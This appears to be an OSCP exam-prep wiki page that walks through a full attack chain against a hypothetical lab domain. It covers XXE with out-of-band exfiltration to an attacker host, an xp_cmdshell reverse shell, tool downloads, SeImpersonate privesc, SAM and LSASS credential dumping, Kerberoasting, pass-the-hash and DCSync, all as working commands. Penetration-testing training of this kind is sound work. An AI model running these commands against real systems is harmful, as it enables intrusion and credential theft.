---
title: OSCP full-chain walkthrough (worked example)
slug: oscp-full-chain-walkthrough
aliases: [oscp-full-chain, oscp-worked-example]
---

{% raw %}

> **TL;DR:** A worked OSCP-style attack chain: external recon → web foothold → low-priv shell → Windows privesc → AD enumeration → Kerberoast → lateral via WinRM → Domain Admin. Times are realistic for someone passing the exam in the upper-middle of the bell curve. Pair with [[oscp-roadmap]] and [[oscp-exam-methodology]].

## The hypothetical target

| Host | Role | Notes |
|---|---|---|
| `WEB01` (10.10.10.5) | Internet-facing IIS + custom app | initial foothold |
| `JUMP01` (10.10.10.6) | Workstation, domain-joined | first AD pivot |
| `DC01` (10.10.10.10) | Domain controller — `corp.local` | the goal |

You have a starting point on `tun0` (10.10.14.5) and credentials to the Kali VPN only.

## Hour 0 — recon

```bash
# Sweep
nmap -Pn -p- --min-rate=2000 10.10.10.0/24 -oA scans/sweep

# Service detail on what you see
nmap -sV -sC -p 80,135,139,445,3389,5985,5986 -oA scans/srv 10.10.10.5,6,10
```

Findings:
- `WEB01`: 80 (IIS 10), 5985 (WinRM).
- `JUMP01`: 135, 445, 3389, 5985.
- `DC01`: 53, 88, 135, 389, 445, 464, 593, 636, 3268, 3269, 5985.

```bash
# Web enum
ffuf -u http://10.10.10.5/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -o ffuf-web01.json
# /uploads (403), /admin (302 → /login), /api (200, json), /backup.zip (200!)
```

`backup.zip` decompresses to a `web.config` containing a connection string with `webapp/hunter2`.

## Hour 1 — foothold on WEB01

The app's `/login` accepts `webapp/hunter2`. Once logged in, `/admin/import` accepts an XML file:

```http
POST /admin/import HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<root><name>&xxe;</name></root>
```

Response leaks `win.ini` — classic XXE. Pivot to OOB:

```http
<!DOCTYPE foo [<!ENTITY % ext SYSTEM "http://10.10.14.5/x.dtd"> %ext;]>
```

Your DTD:
```xml
<!ENTITY % file SYSTEM "file:///C:/users/webapp/desktop/notes.txt">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://10.10.14.5/?d=%file;'>">
%all;
```

`notes.txt` contains a SQL Server account: `webuser/N0tesP@ss!`.

`mssqlclient.py` to MSSQL on 1433 (silently exposed):
```
impacket-mssqlclient WEB01\\webuser:N0tesP@ss!@10.10.10.5 -windows-auth
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> xp_cmdshell whoami
nt service\mssqlserver
```

See [[mssql-xp-cmdshell-impersonation-chains]] for the deeper version.

## Hour 2 — first shell on WEB01

```sql
xp_cmdshell powershell -nop -w hidden -e <base64 reverse shell to 10.10.14.5:443>
```

```bash
# attacker
nc -lvnp 443
# *** got shell ***
PS C:\Windows\system32> whoami
nt service\mssqlserver
```

## Hour 3 — privesc on WEB01

```powershell
# winPEAS via SMB share (no SMBServer.py issues with WinRM)
iwr http://10.10.14.5/winPEASx64.exe -OutFile C:\Users\Public\wp.exe
C:\Users\Public\wp.exe > C:\Users\Public\out.txt
```

winPEAS flags:
- `SeImpersonatePrivilege` enabled.
- IIS service account → classic `SeImpersonate` privesc.

Drop `GodPotato.exe`, fire:
```powershell
.\GodPotato.exe -cmd "cmd /c net localgroup administrators webuser /add"
```

Now `webuser` is local admin. Reconnect via WinRM as a stable shell, dump SAM/LSA:
```
evil-winrm -i 10.10.10.5 -u webuser -p 'N0tesP@ss!'
*Evil-WinRM* PS> reg save HKLM\SAM C:\Users\Public\sam
*Evil-WinRM* PS> reg save HKLM\SYSTEM C:\Users\Public\system
```

`secretsdump.py` extracts cached domain hashes → `kim.miller` (a help-desk user) with NetNTLMv1 cached on the host.

## Hour 5 — AD recon

`kim.miller` is a low-priv domain user. SOCKS-tunnel via WEB01:

```bash
# attacker
chisel server -p 8001 --reverse
# WEB01
chisel.exe client 10.10.14.5:8001 R:1080:socks
# attacker
proxychains4 -q ldapsearch -H ldap://10.10.10.10 -D 'kim.miller@corp.local' \
  -w 'KimPass1!' -b 'dc=corp,dc=local' '(objectClass=user)' samaccountname servicePrincipalName
```

BloodHound:
```bash
proxychains4 -q bloodhound-python -u kim.miller -p 'KimPass1!' -d corp.local -gc DC01.corp.local -c All -ns 10.10.10.10
```

BloodHound shortest path: `kim.miller` → `WriteDACL` → group `IT Support`, which has admin rights on `JUMP01`. Also a Kerberoastable account `svc_sql` is in the path.

## Hour 7 — Kerberoast

```bash
proxychains4 -q impacket-GetUserSPNs -request -dc-ip 10.10.10.10 'corp.local/kim.miller:KimPass1!'
# hashcat -m 13100 svc_sql.hash rockyou.txt
# → SqlSvc#2024
```

`svc_sql` is a member of `IT Support`. We are now `svc_sql` → effectively `IT Support` → local admin on `JUMP01`.

## Hour 8 — lateral to JUMP01

```bash
proxychains4 -q evil-winrm -i 10.10.10.6 -u svc_sql -p 'SqlSvc#2024'
```

On JUMP01: dump LSASS via comsvcs.dll trick (no Mimikatz upload):
```powershell
$lsass = Get-Process lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass.Id C:\Users\Public\l.dmp full
```

Pull the dump, run `pypykatz`:
```bash
pypykatz lsa minidump l.dmp
# → finds a logon for 'corp\administrator' with NTLM hash (cached from earlier RDP)
```

## Hour 10 — Domain Admin

```bash
proxychains4 -q impacket-psexec corp.local/administrator@10.10.10.10 \
  -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931...
# Or, equivalent, dcsync to get everything:
proxychains4 -q impacket-secretsdump corp.local/administrator@10.10.10.10 \
  -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931...
```

DCSync output gives every hash, krbtgt included. From here you can mint golden tickets — see [[golden-tickets]]. **For the exam, screenshot the DA shell and the flag, then stop.**

## Total elapsed time
~10 hours. The exam allows 24. The 14 hours of cushion is what you need for the *one box that doesn't go to plan* — usually it's the privesc step on a Linux standalone.

## What each hour taught
- **0:** Recon is data collection, not interpretation. Capture everything; read later.
- **1:** Public exploit / XXE / config leak — the foothold is usually one input field.
- **2-3:** Privesc on Windows is almost always service account → SeImpersonate → token.
- **5-7:** BloodHound + Kerberoast is the AD opening for 80% of OSCP-style chains.
- **8-10:** Lateral isn't movement, it's harvesting — every new host is a new dump opportunity.

## Common alternate paths

If WEB01 had no XXE but had file upload (no extension check):
- Upload `.aspx` → cmd shell as IIS pool.

If JUMP01 was Linux:
- SSH with svc_sql's key → `sudo -l` → GTFOBins privesc.

If `svc_sql` had no SPN:
- AS-REP roast another user in IT Support.

If LSASS dump was blocked:
- DCSync from kim.miller if she had `Replicating Directory Changes` (rare gift).
- Use MSSQL linked server chain (see [[mssql-xp-cmdshell-impersonation-chains]]).

## References
- [TJ Null OSCP-like list](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/)
- [HackTricks — full pentest checklist](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- See also: [[oscp-roadmap]], [[oscp-exam-methodology]], [[bloodhound]], [[kerberoasting]], [[evil-winrm]]

{% endraw %}
